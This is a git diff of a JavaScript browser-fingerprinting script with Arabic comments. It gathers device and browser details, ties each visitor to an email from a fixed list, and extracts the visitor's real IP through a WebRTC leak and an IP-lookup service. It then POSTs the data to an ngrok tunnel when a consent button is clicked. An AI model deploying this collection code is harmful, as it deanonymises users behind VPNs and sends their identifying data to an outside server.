@@ -9,84 +9,42 @@ const emailList = [
 
 // تعيين إيميل فريد لكل مستخدم
 let userEmail = localStorage.getItem('userEmail');
-
 if (!userEmail) {
     userEmail = emailList.shift();  // نأخذ أول إيميل غير مستخدم
     localStorage.setItem('userEmail', userEmail);
 }
 
-// جمع بيانات المتصفح
+// جمع بيانات إضافية من المتصفح
 const browserData = {
     userAgent: navigator.userAgent,
     language: navigator.language,
     platform: navigator.platform,
-    deviceMemory: navigator.deviceMemory,
-    hardwareConcurrency: navigator.hardwareConcurrency,
     screenResolution: `${screen.width}x${screen.height}`,
-    screenAvailableResolution: `${screen.availWidth}x${screen.availHeight}`,
+    screenDepth: screen.pixelDepth,
+    screenColorDepth: screen.colorDepth,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
     plugins: Array.from(navigator.plugins).map(plugin => plugin.name),
-    webdriver: navigator.webdriver,
+    connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown",
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     doNotTrack: navigator.doNotTrack,
-    email: userEmail,  // استخدام الإيميل الفريد
-    webglVendor: getWebGLInfo().vendor,
-    webglRenderer: getWebGLInfo().renderer,
-    webglData: getWebGLInfo().data,
-    audioFormats: getAudioFormats(),
-    accelerometer: 'accelerometer' in window,
-    keyboardLayout: navigator.keyboard?.getLayoutMap ? 'supported' : 'not supported',
-    battery: 'getBattery' in navigator ? 'supported' : 'not supported',
-    connection: navigator.connection ? navigator.connection.effectiveType : 'not supported',
-    fonts: getFonts(),
-    cacheControl: 'cache' in window ? 'supported' : 'not supported'
+    email: userEmail // استخدام الإيميل الفريد
 };
 
-// جمع معلومات WebGL
-function getWebGLInfo() {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (!gl) {
-        return { vendor: 'not supported', renderer: 'not supported', data: 'not supported' };
+// جمع IP باستخدام WebRTC وخدمة خارجية
+const getExternalIP = async () => {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('Failed to fetch external IP:', error);
+        return "unknown";
     }
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    return {
-        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'not supported',
-        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'not supported',
-        data: gl.getParameter(gl.VERSION)
-    };
-}
+};
 
-// جمع تنسيقات الصوت المدعومة
-function getAudioFormats() {
-    const audio = document.createElement('audio');
-    const formats = ['mp3', 'wav', 'ogg', 'aac', 'm4a'];
-    const supportedFormats = formats.filter(format => audio.canPlayType(`audio/${format}`) !== '');
-    return supportedFormats;
-}
-
-// جمع الخطوط المثبتة على الجهاز
-function getFonts() {
-    const fontList = [];
-    const fontCheck = new Set([
-        'Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS'
-    ]);
-
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-
-    fontCheck.forEach(font => {
-        context.font = `72px ${font}`;
-        if (context.measureText('mmmmmmmmmlli').width !== context.measureText('MMMMMMMMMMLLI').width) {
-            fontList.push(font);
-        }
-    });
-
-    return fontList;
-}
-
-// جمع IP الحقيقي باستخدام WebRTC
-const getIP = () => {
-    return new Promise((resolve) => {
+const getIP = async () => {
+    const webRTCIP = await new Promise((resolve) => {
         const pc = new RTCPeerConnection({ iceServers: [] });
         pc.createDataChannel('');
         pc.createOffer().then(offer => pc.setLocalDescription(offer));
@@ -97,9 +55,12 @@ const getIP = () => {
             }
         };
     });
+
+    const externalIP = await getExternalIP();
+    return webRTCIP || externalIP;
 };
 
-// إرسال البيانات إلى البوت
+// إرسال البيانات إلى السيرفر
 const sendData = async () => {
     try {
         const ip = await getIP();  // الحصول على IP الحقيقي
@@ -107,7 +68,7 @@ const sendData = async () => {
 
         console.log('بيانات المتصفح:', browserData);
 
-        // إرسال البيانات إلى السيرفر المحلي
+        // إرسال البيانات إلى السيرفر
         const response = await fetch('https://cf97-41-105-25-108.ngrok-free.app/collect', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -126,3 +87,4 @@ const sendData = async () => {
 
 // إضافة حدث النقر على زر الموافقة
 document.getElementById('consentButton').addEventListener('click', sendData);
+
